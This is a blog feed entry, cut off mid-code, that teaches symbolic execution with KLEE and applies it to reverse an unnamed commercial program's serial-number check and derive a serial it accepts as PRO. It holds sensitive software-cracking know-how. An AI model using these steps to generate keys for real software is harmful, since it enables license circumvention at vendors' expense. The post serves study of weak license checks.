<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: reverse-engineering | Diary of a reverse-engineer]]></title>
  <link href="http://doar-e.github.io/blog/categories/reverse-engineering/atom.xml" rel="self"/>
  <link href="http://doar-e.github.io/"/>
  <updated>2018-01-15T12:35:45-08:00</updated>
  <id>http://doar-e.github.io/</id>
  <author>
    <name><![CDATA[Axel Souchet, Jonathan Salwan, Jérémy Fetiveau]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Keygenning with KLEE]]></title>
    <link href="http://doar-e.github.io/blog/2015/08/18/keygenning-with-klee/"/>
    <updated>2015-08-18T22:12:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2015/08/18/keygenning-with-klee</id>
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>In the past weeks I enjoyed working on reversing a piece of software (don&rsquo;t ask me the name), to study how serial numbers are validated. The story the user has to follow is pretty common: download the trial, pay, get the serial number, use it in the annoying nag screen to get the fully functional version of the software.</p>

<p>Since my purpose is to not damage the company developing the software, I will not mention the name of the software, nor I will publish the final key generator in binary form, nor its source code. My goal is instead to study a real case of serial number validation, and to highlight its weaknesses.</p>

<p>In this post we are going to take a look at the steps I followed to reverse the serial validation process and to make a key generator using <a href="http://klee.github.io/">KLEE</a> symbolic virtual machine. We are not going to follow all the details on the reversing part, since you cannot reproduce them on your own. We will concentrate our thoughts on the key-generator itself: that is the most interesting part.</p>

<div class='entry-content-toc'></div>




<!--more-->


<h2>Getting acquainted</h2>

<p>The software is an <code>x86</code> executable, with no anti-debugging, nor anti-reversing techniques. When started it presents a nag screen asking for a registration composed by: customer number, serial number and a mail address. This is fairly common in software.</p>

<h2>Tools of the trade</h2>

<p>First steps in the reversing are devoted to find all the interesting functions to analyze. To do this I used <a href="https://www.hex-rays.com/products/ida/">IDA Pro</a> with Hex-Rays decompiler, and the <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff551063%28v=vs.85%29.aspx">WinDbg</a> debugger. For the last part I used <a href="http://klee.github.io/">KLEE</a> symbolic virtual machine under Linux, <a href="https://gcc.gnu.org/">gcc compiler</a> and some bash scripting. The actual key generator was a simple <a href="https://msdn.microsoft.com/en-us/library/ms754130%28v=vs.100%29.aspx">WPF</a> application.</p>

<p>Let me skip the first part, since it is not very interesting. You can find many other articles on the web that can guide you through basic reversing techniques with IDA Pro. I only kept in mind some simple rules, while going forward:</p>

<ul>
<li>always rename functions that uses interesting data, even if you don&rsquo;t know precisely what they do. A name like <code>license_validation_unknown_8</code> is always better than a default like <code>sub_46fa39</code>;</li>
<li>similarly, rename data whenever you find it interesting;</li>
<li>change data types when you are sure they are wrong: use structs and arrays in case of aggregates;</li>
<li>follow cross references of data and functions to expand your collection;</li>
<li>validate your beliefs with the debugger if possible. For example, if you think a variable contains the serial, break with the debugger and see if it is the case.</li>
</ul>


<h2>Big picture</h2>

<p>When I collected the most interesting functions, I tried to understand the high level flow and the simpler functions. Here are the main variables and types used in the validation process. As a note for the reader: most of them have been purged of uninteresting details, for the sake of simplicity.</p>

<p>```c
enum {</p>

<pre><code>ERROR,
STANDARD,
PRO
</code></pre>

<p>} license_type = ERROR;
```
Here we have a global variable providing the type of the license, used to enable and disable features of the application.</p>

<p>```c
enum result_t {</p>

<pre><code>INVALID,
VALID,
VALID_IF_LAST_VERSION
</code></pre>

<p>};
<code>``
This is a convenient</code>enum<code>used as a result for the validation.</code>INVALID<code>and</code>VALID<code>values are pretty self-explanatory. </code>VALID_IF_LAST_VERSION` tells that this registration is valid only if the current software version is the last available. The reasons for this strange possibility will be clear shortly.</p>

<p>```c</p>

<h1>define HEADER_SIZE 8192</h1>

<p>struct {</p>

<pre><code>int header[HEADER_SIZE];
int data[1000000];
</code></pre>

<p>} mail_digest_table;
<code>``
This is a data structure, containing digests of mail addresses of known registered users. This is a pretty big file embedded in the executable itself. During startup, a resource is extracted in a temporary file and its content copied into this struct. Each element of the</code>header<code>vector is an offset pointing inside the</code>data` vector.</p>

<p>Here we have a pseudo-C code for the registration check, that uses data types and variables explained above:
```c
enum result_t check_registration(int serial, int customer_num, const char* mail) {</p>

<pre><code>// validate serial number
license_type = get_license_type(serial);
if (license_type == ERROR)
    return INVALID;

// validate customer number
int expected_customer = compute_customer_number(serial, mail);
if (expected_customer != customer_num)
    return INVALID;

// validate w.r.t. known registrations
int index = get_index_in_mail_table(serial);
if (index &gt; HEADER_SIZE)
    return VALID_IF_LAST_VERSION;
int mail_digest = compute_mail_digest(mail);
for (int i = 0; i &lt; 3; ++i) {
    if (mail_digest_table[index + i] == mail_digest)
        return VALID;
}
return INVALID;
</code></pre>

<p>}
```</p>

<p>The validation is divided in three main parts:</p>

<ul>
<li>serial number must be valid by itself;</li>
<li>serial number, combined with mail address has to correspond to the actual customer number;</li>
<li>there has to be a correspondence between serial number and mail address, stored in a static table in the binary.</li>
</ul>


<p>The last point is a little bit unusual. Let me restate it in this way: whenever a customer buys the software, the customer table gets updated with its data and become available in the <em>next</em> version of the software (because it is embedded in the binary and not downloaded trough the internet). This explains the <code>VALID_IF_LAST_VERSION</code> check: if you buy the software today, the current version does not contain your data. You are still allowed to get a &ldquo;pro&rdquo; version until a new version is released. In that moment you are forced to update to that new version, so the software can verify your registration with the updated table. Here is a pseudo-code of that check:</p>

<p>```c
switch (check_registration(serial, customer, mail)) {
case VALID:</p>

<pre><code>// the registration is OK! activate functionalities
activate_pro_functionality();
break;
</code></pre>

<p>case VALID_IF_LAST_VERSION:</p>

<pre><code>{
    // check if the current version is the last, by
    // using the internet.
    int current_version = get_current_version();
    int last_version = get_last_version();
    if (current_version == last_version)
        // OK for now: a new version is not available
        activate_pro_functionality();
    else
        // else, force the user to download the new version
        // before proceed
        ask_download();
}
break;
</code></pre>

<p>case INVALID:</p>

<pre><code>// registration is not valid
handle_invalid_registration();
break;
</code></pre>

<p>}
```</p>

<p>The version check is done by making an HTTP request to a specific page that returns a page having only the last version number of the software. Don&rsquo;t ask me why the protection is not completely server side but involves static tables, version checks and things like that. I don&rsquo;t know!</p>

<p>Anyway, this is the big picture of the registration validation functions, and this is pretty boring. Let&rsquo;s move on to the interesting part. You may notice that I provided code for the main procedure, but not for the helper functions like <code>get_license_type</code>, <code>compute_customer_number</code>, and so on. This is because I did not have to reverse them. They contain a lot of arithmetical and logical operations on registration data, and they are very difficult to understand. The good news is that we do not have to understand them, we need only to reverse them!</p>

<h2>Symbolic execution</h2>

<p>Symbolic execution is a way to execute programs using symbolic variables instead of concrete values. A symbolic variable is used whenever a value can be controlled by user input (this can be done by hand or determined by using taint analysis), and could be a file, standard input, a network stream, etc. Symbolic execution translates the program&rsquo;s semantics into a logical formula. Each instruction cause that formula to be updated. By solving a formula for one path, we get concrete values for the variables. If those values are used in the program, the execution reaches that program point. Dynamic Symbolic Execution (DSE) builds the logical formula at runtime, step-by-step, following one path at a time. When a branch of the program is found during the execution, the engine transforms the condition into arithmetic operations. It then chooses the T (true) or F (false) branch and updates the formula with this new constraint (or its negation). At the end of a path, the engine can backtrack and select another path to execute. For example:</p>

<p>```c
int v1 = SymVar_1, v2 = SymVar_2; // symbolic variables
if (v1 > 0)</p>

<pre><code>v2 = 0;
</code></pre>

<p>if (v2 == 0 &amp;&amp; v1 &lt;= 0)
   error();
```</p>

<p>We want to check if <code>error</code> is reachable, by using symbolic variables <code>SymVar_1</code> and <code>SymVar_2</code>, assigned to the program&rsquo;s variables <code>v1</code> and <code>v2</code>. In line 2 we have the condition <code>v1 &gt; 0</code> and so, the symbolic engine adds a constraint <code>SymVar_1 &gt; 0</code> for the <em>true branch</em> or conversely <code>SymVar_1 &lt;= 0</code> for the <em>false branch</em>. It then continues the execution trying with the first constraint. Whenever a new path condition is reached, new constraints are added to the symbolic state, until that condition is no more satisfiable. In that case, the engine backtracks and replaces some constraints with their negation, in order to reach other code paths. The execution engine tries to cover all code paths, by solving those constraints and their negations. For each portion of the code reached, the symbolic engine outputs a test case covering that part of the program, providing concrete values for the input variables. In the particular example given, the engine continues the execution, and finds the condition <code>v2 == 0 &amp;&amp; v1 &lt;= 0</code> at line 4. The path formula becomes so: <code>SymVar_1 &gt; 0 &amp;&amp; (SymVar_2 == 0 &amp;&amp; SymVar_1 &lt;= 0)</code>, that is not satisfiable. The symbolic engine provides then values for the variables that satisfies the previous formula (<code>SymVar_1 &gt; 0</code>). For example <code>SymVar_1 = 1</code> and some random value for <code>SymVar_2</code>. The engine then backtrack to the previous branch and uses the negation of the constraint, that is <code>SymVar_1 &lt;= 0</code>. It then adds the negation of the current constraint to cover the false branch, obtaining <code>SymVar_1 &lt;= 0 &amp;&amp; (SymVar_2 != 0 || SymVar_1 &gt; 0)</code>. This is satisfiable with <code>SymVar_1 = -1</code> and <code>SymVar_2 = 0</code>. This concludes the analysis of the program paths, and our symbolic execution engine can output the following test cases:</p>

<ul>
<li><code>v1 = 1</code>;</li>
<li><code>v1 = -1</code>, <code>v2 = 0</code>.</li>
</ul>


<p>Those test cases are enough to cover all the paths of the program.</p>

<p>This approach is useful for testing because it helps generating test cases. It is often effective, and it does not waste computational power of your brain. You know&hellip; tests are very difficult to do effectively, and brain power is such a scarce resource!</p>

<p>I don&rsquo;t want to elaborate too much on this topic because it is way too big to fit in this post. Moreover, we are not going to use symbolic execution engines for testing purpose. This is just because we don&rsquo;t like to use things in the way they are intended :)</p>

<p>However, I will point you to some good references in the last section. Here I can list a series of common strengths and weaknesses of symbolic execution, just to give you a little bit of background:</p>

<p>Strengths:</p>

<ul>
<li>when a test case fails, the program is proven to be incorrect;</li>
<li>automatic test cases catch errors that often are overlooked in manual written test cases (this is from <a href="http://www.doc.ic.ac.uk/~cristic/papers/klee-osdi-08.pdf">KLEE paper</a>);</li>
<li>when it works it&rsquo;s cool :) (and this is from <a href="https://twitter.com/__x86">Jérémy</a>);</li>
</ul>


<p>Weaknesses:</p>

<ul>
<li>when no tests fail we are not sure everything is correct, because no proof of correctness is given; static analysis can do that when it works (and often it does not!);</li>
<li>covering all the paths is not enough, because a variable can hold different values in one path and only some of them cause a bug;</li>
<li>complete coverage for non trivial programs is often impossible, due to path explosion or constraint solver timeout;</li>
<li>scaling is difficult, and execution time of the engine can suffer;</li>
<li>undefined behavior of CPU could lead to unexpected results;</li>
<li>&hellip; and maybe there are a lot more remarks to add.</li>
</ul>


<h1>KLEE</h1>

<p>KLEE is a great example of a symbolic execution engine. It operates on <a href="http://llvm.org/">LLVM</a> byte code, and it is used for software verification purposes. KLEE is capable to automatically generate test cases achieving high code coverage. KLEE is also able to find memory errors such as out of bound array accesses and many other common errors. To do that, it needs an LLVM byte code version of the program, symbolic variables and (optionally) assertions. I have also prepared a <a href="https://registry.hub.docker.com/u/mbrt/klee/">Docker image</a> with <code>clang</code> and <code>klee</code> already configured and ready to use. So, you have no excuses to not try it out! Take this example function:</p>

<p>```c</p>

<h1>define FALSE 0</h1>

<h1>define TRUE 1</h1>

<p>typedef int BOOL;</p>

<p>BOOL check_arg(int a) {</p>

<pre><code>if (a &gt; 10)
    return FALSE;
else if (a &lt;= 10)
    return TRUE;
return FALSE; // not reachable
</code></pre>

<p>}
```</p>

<p>This is actually a silly example, I know, but let&rsquo;s pretend to verify this function with this main:</p>

<p>```c</p>

<h1>include &lt;assert.h></h1>

<h1>include &lt;klee/klee.h></h1>

<p>int main() {</p>

<pre><code>int input;
klee_make_symbolic(&amp;input, sizeof(int), "input");
return check_arg(input);
</code></pre>

<p>}
```</p>

<p>In <code>main</code> we have a symbolic variable used as input for the function to be tested. We can also modify it to include an assertion:</p>

<p>```c
BOOL check_arg(int a) {</p>

<pre><code>if (a &gt; 10)
    return FALSE;
else if (a &lt;= 10)
    return TRUE;
klee_assert(FALSE);
return FALSE; // not reachable
</code></pre>

<p>}
```</p>

<p>We can now use <code>clang</code> to compile the program to the LLVM byte code and run the test generation with the <code>klee</code> command:</p>

<p><code>
clang -emit-llvm -g -o test.ll -c test.c
klee test.ll
</code></p>

<p>We get this output:</p>

<p>```
KLEE: output directory is &ldquo;/work/klee-out-0&rdquo;</p>

<p>KLEE: done: total instructions = 26
KLEE: done: completed paths = 2
KLEE: done: generated tests = 2
```</p>

<p>KLEE will generate test cases for the <code>input</code> variable, trying to cover all the possible execution paths and to make the provided assertions to fail (if any given). In this case we have two execution paths and two generated test cases, covering them. Test cases are in the output directory (in this case <code>/work/klee-out-0</code>). The soft link <code>klee-last</code> is also provided for convenience, pointing to the last output directory. Inside that directory a bunch of files were created, including the two test cases named <code>test000001.ktest</code> and <code>test000002.ktest</code>. These are binary files, which can be examined with the <code>ktest-tool</code> utility. Let&rsquo;s try it:</p>

<p><code>
$ ktest-tool --write-ints klee-last/test000001.ktest
ktest file : 'klee-last/test000001.ktest'
args       : ['test.ll']
num objects: 1
object    0: name: 'input'
object    0: size: 4
object    0: data: 2147483647
</code></p>

<p>And the second one:</p>

<p><code>
$ ktest-tool --write-ints klee-last/test000002.ktest
...
object    0: data: 0
</code></p>

<p>In these test files, KLEE reports the command line arguments, the symbolic objects along with their size and the value provided for the test. To cover the whole program, we need <code>input</code> variable to get a value greater than 10 and one below or equal. You can see that this is the case: in the first test case the value 2147483647 is used, covering the first branch, while 0 is provided for the second, covering the other branch.</p>

<p>So far, so good. But what if we change the function in this way?</p>

<p>```c
BOOL check_arg(int a) {</p>

<pre><code>if (a &gt; 10)
    return FALSE;
else if (a &lt; 10)    // instead of &lt;=
    return TRUE;
klee_assert(FALSE);
return FALSE;       // now reachable
</code></pre>

<p>}
```</p>

<p>We get this output:</p>

<p>```
$ klee test.ll
KLEE: output directory is &ldquo;/work/klee-out-2&rdquo;
KLEE: ERROR: /work/test.c:9: ASSERTION FAIL: 0
KLEE: NOTE: now ignoring this error at this location</p>

<p>KLEE: done: total instructions = 27
KLEE: done: completed paths = 3
KLEE: done: generated tests = 3
```</p>

<p>And this is the <code>klee-last</code> directory contents:</p>

<p><code>
$ ls klee-last/
assembly.ll   run.istats        test000002.assert.err  test000003.ktest
info          run.stats         test000002.ktest       warnings.txt
messages.txt  test000001.ktest  test000002.pc
</code></p>

<p>Note the <code>test000002.assert.err</code> file. If we examine its corresponding test file, we have:</p>

<p><code>
$ ktest-tool --write-ints klee-last/test000002.ktest
ktest file : 'klee-last/test000002.ktest'
...
object    0: data: 10
</code></p>

<p>As we had expected, the assertion fails when <code>input</code> value is 10. So, as we now have three execution paths, we also have three test cases, and the whole program gets covered. KLEE provides also the possibility to replay the tests with the real program, but we are not interested in it now. You can see a usage example in this <a href="http://klee.github.io/tutorials/testing-function/#replaying-a-test-case">KLEE tutorial</a>.</p>

<p>KLEE&rsquo;s abilities to find execution paths of an application are very good. According to the <a href="http://llvm.org/pubs/2008-12-OSDI-KLEE.html">OSDI 2008 paper</a>, KLEE has been successfully used to test all 89 stand-alone programs in GNU COREUTILS and the equivalent busybox port, finding previously undiscovered bugs, errors and inconsistencies. The achieved code coverage were more than 90% per tool. Pretty awesome!</p>

<p>But, you may ask: <a href="https://www.youtube.com/watch?v=j_T9YtA1mRQ">The question is, who cares?</a>. You will see it in a moment.</p>

<h2>KLEE to reverse a function</h2>

<p>As we have a powerful tool to find execution paths, we can use it to find the path we are interested in. As showed by the nice <a href="https://feliam.wordpress.com/2010/10/07/the-symbolic-maze/">symbolic maze</a> post of Feliam, we can use KLEE to solve a maze. The idea is simple but very powerful: flag the portion of code you interested in with a <code>klee_assert(0)</code> call, causing KLEE to highlight the test case able to reach that point. In the maze example, this is as simple as changing a <code>read</code> call with a <code>klee_make_symbolic</code> and the <code>prinft("You win!\n")</code> with the already mentioned <code>klee_assert(0)</code>. Test cases triggering this assertion are the one solving the maze!</p>

<p>For a concrete example, let&rsquo;s suppose we have this function:</p>

<p>```c
int magic_computation(int input) {</p>

<pre><code>for (int i = 0; i &lt; 32; ++i)
    input ^= 1 &lt;&lt; i;
return input;
</code></pre>

<p>}
```</p>

<p>And we want to know for what input we get the output 253. A main that tests this could be:</p>

<p>```c
int main(int argc, char* argv[]) {</p>

<pre><code>int input = atoi(argv[1]);
int output = magic_computation(input);
if (output == 253)
    printf("You win!\n");
else
    printf("You lose\n");
return 0;
</code></pre>

<p>}
```</p>

<p>KLEE can resolve this problem for us, if we provide symbolic inputs and actually an assert to trigger:</p>

<p>```c
int main(int argc, char* argv[]) {</p>

<pre><code>int input, result;
klee_make_symbolic(&amp;input, sizeof(int), "input");
result = magic_computation(input);
if (result == 253)
    klee_assert(0);
return 0;
</code></pre>

<p>}
```</p>

<p>Run KLEE and print the result:</p>

<p><code>
$ clang -emit-llvm -g -o magic.ll -c magic.c
$ klee magic.ll
$ ktest-tool --write-ints klee-last/test000001.ktest
ktest file : 'klee-last/test000001.ktest'
args       : ['magic.ll']
num objects: 1
object    0: name: 'input'
object    0: size: 4
object    0: data: -254
</code></p>

<p>The answer is -254. Let&rsquo;s test it:</p>

<p><code>
$ gcc magic.c
$ ./a.out -254
You win!
</code></p>

<p>Yes!</p>

<h2>KLEE, libc and command line arguments</h2>

<p>Not all the functions are so simple. At least we could have calls to the C standard library such as <code>strlen</code>, <code>atoi</code>, and such. We cannot link our test code with the system available C library, as it is not inspectable by KLEE. For example:</p>

<p>```c
int main(int argc, char* argv[]) {</p>

<pre><code>int input = atoi(argv[1]);
return input;
</code></pre>

<p>}
```</p>

<p>If we run it with KLEE we get this error:</p>

<p><code>
$ clang -emit-llvm -g -o atoi.ll -c atoi.c
$ klee atoi.ll
KLEE: output directory is "/work/klee-out-4"
KLEE: WARNING: undefined reference to function: atoi
KLEE: WARNING ONCE: calling external: atoi(0)
KLEE: ERROR: /work/atoi.c:5: failed external call: atoi
KLEE: NOTE: now ignoring this error at this location
...
</code></p>

<p>To fix this we can use the KLEE uClibc and POSIX runtime. Taken from the help:</p>

<p><em>&ldquo;If we were running a normal native application, it would have been linked with the C library, but in this case KLEE is running the LLVM bitcode file directly. In order for KLEE to work effectively, it needs to have definitions for all the external functions the program may call. Similarly, a native application would be running on top of an operating system that provides lower level facilities like write(), which the C library uses in its implementation. As before, KLEE needs definitions for these functions in order to fully understand the program. We provide a POSIX runtime which is designed to work with KLEE and the uClibc library to provide the majority of operating system facilities used by command line applications&rdquo;</em>.</p>

<p>Let&rsquo;s try to use these facilities to test our <code>atoi</code> function:</p>

<p>```
$ klee &mdash;optimize &mdash;libc=uclibc &mdash;posix-runtime atoi.ll &mdash;sym-args 0 1 3
KLEE: NOTE: Using klee-uclibc : /usr/local/lib/klee/runtime/klee-uclibc.bca
KLEE: NOTE: Using model: /usr/local/lib/klee/runtime/libkleeRuntimePOSIX.bca
KLEE: output directory is &ldquo;/work/klee-out-5&rdquo;
KLEE: WARNING ONCE: calling external: syscall(16, 0, 21505, 70495424)
KLEE: ERROR: /tmp/klee-uclibc/libc/stdlib/stdlib.c:526: memory error: out of bound pointer
KLEE: NOTE: now ignoring this error at this location</p>

<p>KLEE: done: total instructions = 5756
KLEE: done: completed paths = 68
KLEE: done: generated tests = 68
```</p>

<p>And KLEE founds the possible out of bound access in our program. Because you know, our program is bugged :) Before to jump and fix our code, let me briefly explain what these new flags did:</p>

<ul>
<li><code>--optimize</code>: this is for dead code elimination. It is actually a good idea to use this flag when working with non-trivial applications, since it speeds things up;</li>
<li><code>--libc=uclibc</code> and <code>--posix-runtime</code>: these are the aforementioned options for uClibc and POSIX runtime;</li>
<li><code>--sym-args 0 1 3</code>: this flag tells KLEE to run the program with minimum 0 and maximum 1 argument of length 3, and make the arguments symbolic.</li>
</ul>


<p>Note that adding <code>atoi</code> function to our code, adds 68 execution paths to the program. Using many libc functions in our code adds complexity, so we have to use them carefully when we want to reverse complex functions.</p>

<p>Let now make the program safe by adding a check to the command line argument length. Let&rsquo;s also add an assertion, because it is fun :)</p>

<p>```c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;assert.h></h1>

<h1>include &lt;klee/klee.h></h1>

<p>int main(int argc, char* argv[]) {</p>

<pre><code>int result = argc &gt; 1 ? atoi(argv[1]) : 0;
if (result == 42)
    klee_assert(0);
return result;
</code></pre>

<p>}
```</p>

<p>We could also have written <code>klee_assert(result != 42)</code>, and get the same result. No matter what solution we adopt, now we have to run KLEE as before:</p>

<p>```
$ clang -emit-llvm -g -o atoi2.ll -c atoi2.c
$ klee &mdash;optimize &mdash;libc=uclibc &mdash;posix-runtime atoi2.ll &mdash;sym-args 0 1 3
KLEE: NOTE: Using klee-uclibc : /usr/local/lib/klee/runtime/klee-uclibc.bca
KLEE: NOTE: Using model: /usr/local/lib/klee/runtime/libkleeRuntimePOSIX.bca
KLEE: output directory is &ldquo;/work/klee-out-6&rdquo;
KLEE: WARNING ONCE: calling external: syscall(16, 0, 21505, 53243904)
KLEE: ERROR: /work/atoi2.c:8: ASSERTION FAIL: 0
KLEE: NOTE: now ignoring this error at this location</p>

<p>KLEE: done: total instructions = 5962
KLEE: done: completed paths = 73
KLEE: done: generated tests = 69
```</p>

<p>Here we go! We have fixed our bug. KLEE is also able to find an input to make the assertion fail:</p>

<p><code>
$ ls klee-last/ | grep err
test000016.assert.err
$ ktest-tool klee-last/test000016.ktest
ktest file : 'klee-last/test000016.ktest'
args       : ['atoi.ll', '--sym-args', '0', '1', '3']
num objects: 3
...
object    1: name: 'arg0'
object    1: size: 4
object    1: data: '+42\x00'
...
</code></p>

<p>And the answer is the string &ldquo;+42&rdquo;&hellip; as we know.</p>

<p>There are many other KLEE options and functionalities, but let&rsquo;s move on and try to solve our original problem. Interested readers can find a good tutorial, for example, in <a href="http://klee.github.io/tutorials/testing-coreutils/">How to Use KLEE to Test GNU Coreutils</a>.</p>

<h2>KLEE keygen</h2>

<p>Now that we know basic KLEE commands, we can try to apply them to our particular case. We have understood some of the validation algorithm, but we don&rsquo;t know the computation details. They are just a mess of arithmetical and logical operations that we are tired to analyze.</p>

<p>Here is our plan:</p>

<ul>
<li>we need at least a valid customer number, a serial number and a mail address;</li>
<li>more ambitiously we want a list of them, to make a key generator.</li>
</ul>


<p>This is a possibility:</p>

<p>```c
// copy and paste of all the registration code
enum {</p>

<pre><code>ERROR,
STANDARD,
PRO
</code></pre>

<p>} license_type = ERROR;
// &hellip;
enum result_t check_registration(int serial, int customer_num, const char* mail);
// &hellip;</p>

<p>int main(int argc, char* argv[]) {</p>

<pre><code>int serial, customer;
char mail[10];
enum result_t result;
klee_make_symbolic(&amp;serial, sizeof(serial), "serial");
klee_make_symbolic(&amp;customer, sizeof(customer), "customer");
klee_make_symbolic(&amp;mail, sizeof(mail), "mail");

valid = check_registration(serial, customer, mail);
valid &amp;= license_type == PRO;
klee_assert(!valid);
</code></pre>

<p>}
```</p>

<p>Super simple. Copy and paste everything, make the inputs symbolic and assert a certain result (negated, of course).</p>

<p>No! That&rsquo;s not so simple. This is actually the most difficult part of the game. First of all, what do we want to copy? We don&rsquo;t have the source code. In my case I used Hex-Rays decompiler, so maybe I have cheated. When you decompile, however, you don&rsquo;t get immediately a compilable C source code, since there could be dependencies between functions, global variables, and specific Hex-Rays types. For this latter problem I&rsquo;ve prepared a <a href="https://github.com/mbrt/keygen-post/blob/master/src/ida_defs.h"><code>ida_defs.h</code></a> header, providing defines coming from IDA and from Windows headers.</p>

<p>But what to copy? The high level picture of the validation algorithm I have presented is an ideal one. The <code>check_registration</code> function is actually a big set of auxiliary functions and data, very tightened with other parts of the program. Even if we now know the most interesting functions, we need to know how much of the related code, is useful or not. We cannot throw everything in our key generator, since every function brings itself other related data and functions. In this way we will end up having the whole program in it. We need to minimize the code KLEE has to analyze, otherwise it will be too difficult to have its job done.</p>

<p>This is a picture of the high level workflow, as IDA proximity view proposes:</p>

<p><img src="https://raw.githubusercontent.com/mbrt/keygen-post/master/known_license_func_diagram.png" alt="Known license functions" /></p>

<p>and this is the overview for a single node of this schema (precisely <code>license_getType</code>):</p>

<p><img src="https://raw.githubusercontent.com/mbrt/keygen-post/master/get_license_type_overview.png" alt="license_getType overview" /></p>

<p>As you can imagine, the complete call graph becomes really big in the end.</p>

<p>In the cleanup process I have done, a big bunch of functions removed is the one extracting and loading the table of valid mail addresses. To do this I stepped with the debugger until the table was completely loaded and then dumped the memory of the process. Then I&rsquo;ve used a nice &ldquo;export to C array&rdquo; functionality of <a href="http://www.hexworkshop.com/">HEX Workshop</a>, to export the actual piece of memory of the mail table to actual code:</p>

<p>```c
uint16_t hashHeader[8192] =
{</p>

<pre><code>0x0, 0x28, 0x12, 0x24, 0x2d, 0x2b, 0x2e, 0x23, 0x2b, 0x26,
// ...
</code></pre>

<p>};
int16_t hashData[1000000] =
{</p>

<pre><code>15306, 18899, 18957, -24162, 63045, -26834, -21, -39653, 271441, -5588,
// ...
</code></pre>

<p>};
```</p>

<p>But, cutting out code is not the only problem I&rsquo;ve found in this step. External constraints must be carefully considered. For example the <a href="http://www.cplusplus.com/reference/ctime/time/">time</a> function can be handled by KLEE itself. KLEE tries to generate useful values even from that function. This is good if we want to test bugs related to a strange current time, but in our case, since the code will be executed by the program <em>at a particular time</em>, we are only interested in the value provided at that time. We don&rsquo;t want KLEE traits this function as symbolic; we only want the right time value. To solve that problem, I have replaced all the calls to <code>time</code> to a <code>my_time</code> function, returning a fixed value, defined in the source code.</p>

<p>Another problem comes from the extraction of the functions from their outer context. Often code is written with <em>implicit conventions</em> in mind. These are not self-evident in the code because checks are avoided. A trivial example is the null terminator and valid ASCII characters in strings. KLEE does not assume those constraints, but the validation code does. This is because the GUI provides only valid strings. A less trivial example is that the mail address is always passed lowercase from the GUI to the lower level application logic. This is not self-evident if you do not follow every step from the user input to the actual computations with the data.</p>

<p>The solution to this latter problem is to provide those constraints to KLEE:</p>

<p>```c
char mail[10];
char c;
klee_make_symbolic(mail, sizeof(mail), &ldquo;mail&rdquo;);
for (i = 0; i &lt; sizeof(mail) &ndash; 1; ++i) {</p>

<pre><code>c = mail[i];
klee_assume( (c &gt;= '0' &amp; c &lt;= '9') | (c &gt;= 'a' &amp; c &lt;= 'z') | c == '\0' );
</code></pre>

<p>}
klee_assume(mail[sizeof(mail) &ndash; 1] == &lsquo;\0&rsquo;);
```</p>

<p>Logical operators inside <code>klee_assume</code> function are bitwise and not logical (i.e. <code>&amp;</code> and <code>|</code> instead of <code>&amp;&amp;</code> and <code>||</code>) because they are simpler, since they do not add the extra branches required by lazy operators.</p>

<h2>Throw everything into KLEE</h2>

<p>Having extracted all the needed functions and global data and solved all the issues with the code, we can now move on and run KLEE with our brand new test program:</p>

<p><code>
$ clang -emit-llvm -g -o attempt1.ll -c attempt1.c
$ klee --optimize --libc=uclibc --posix-runtime attempt1.ll
</code></p>

<p>And then wait for an answer.</p>

<p>And wait for another while.</p>

<p>Make some coffee, drink it, come back and watch the PC heating up.</p>

<p>Go out, walk around, come back, have a shower, and&hellip;. oh no! It&rsquo;s still running! OK, that&rsquo;s enough! Let&rsquo;s kill it.</p>

<h2>Deconstruction approach</h2>

<p>We have assumed too much from the tool. It&rsquo;s time to use the brain and ease its work a little bit.</p>

<p>Let&rsquo;s decompose the big picture of the registration check presented before piece by piece. We will try to solve it bit by bit, to reduce the solution space and so, the complexity.</p>

<p>Recall that the algorithm is composed by three main conditions:</p>

<ul>
<li>serial number must be valid by itself;</li>
<li>serial number, combined with mail address have to correspond to the actual customer number;</li>
<li>there has to be a correspondence between serial number and mail address, stored in a static table in the binary.</li>
</ul>


<p>Can we split them in different KLEE runs?</p>

<p>Clearly the first one can be written as:</p>

<p>```c</p>

<h1>include &lt;assert.h></h1>

<h1>include &lt;klee/klee.h></h1>

<p>// include all the functions extracted from the program</p>

<h1>include &ldquo;extracted_code.c&rdquo;</h1>

<p>enum {</p>

<pre><code>ERROR,
STANDARD,
PRO
</code></pre>

<p>} license_type = ERROR;</p>

<p>int main(int argc, char* argv[]) {</p>

<pre><code>int serial, valid;
klee_make_symbolic(&amp;serial, sizeof(serial), "serial");
license_type = get_license_type(serial);
valid = (license_type == PRO);
klee_assert(!valid);
</code></pre>

<p>}
```</p>

<p>And let&rsquo;s see if KLEE can work with this single function:</p>

<p>```
$ clang -emit-llvm -g -o serial_type.ll -c serial_type.c
$ klee &mdash;optimize &mdash;libc=uclibc &mdash;posix-runtime serial_type.ll
&hellip;
KLEE: ERROR: /work/symbolic/serial_type.c:17: ASSERTION FAIL: !valid
&hellip;</p>

<p>$ ls klee-last/ | grep err
test000019.assert.err
$ ktest-tool &mdash;write-ints klee-last/test000019.ktest
ktest file : &lsquo;klee-last/test000019.ktest&rsquo;
args       : [&lsquo;serial_type.ll&rsquo;]
num objects: 2
object    0: name: &lsquo;model_version&rsquo;
object    0: size: 4
object    0: data: 1
object    1: name: &lsquo;serial&rsquo;
object    1: size: 4
object    1: data: 102690141
```</p>

<p>Yes! we now have a serial number that is considered PRO by our target application.</p>

<p>The third condition is less simple: we have a table in which are stored values matching mail addresses with serial numbers. The high level check is this:</p>

<p>```c
int check(int serial, char* mail) {</p>

<pre><code>int index = get_index_in_mail_table(serial);
if (index &gt; HEADER_SIZE)
    return VALID_IF_LAST_VERSION;
int mail_digest = compute_mail_digest(mail);
for (int i = 0; i &lt; 3; ++i) {
    if (mail_digest_table[index + i] == mail_digest)
        return VALID;
}
return INVALID;
</code></pre>

<p>}
```</p>

<p>This piece of code imposes constraints on our mail address and serial number, but not on the customer number. We can rewrite the checks in two parts, the one checking the serial, and the one checking the mail address:</p>

<p>```c
int check_serial(int serial, char* mail) {</p>

<pre><code>int index = get_index_in_mail_table(serial);
int valid = index &lt;= HEADER_SIZE;
</code></pre>

<p>}</p>

<p>int check_mail(char* mail, int index) {</p>

<pre><code>int mail_digest = compute_mail_digest(mail);
for (int i = 0; i &lt; 3; ++i) {
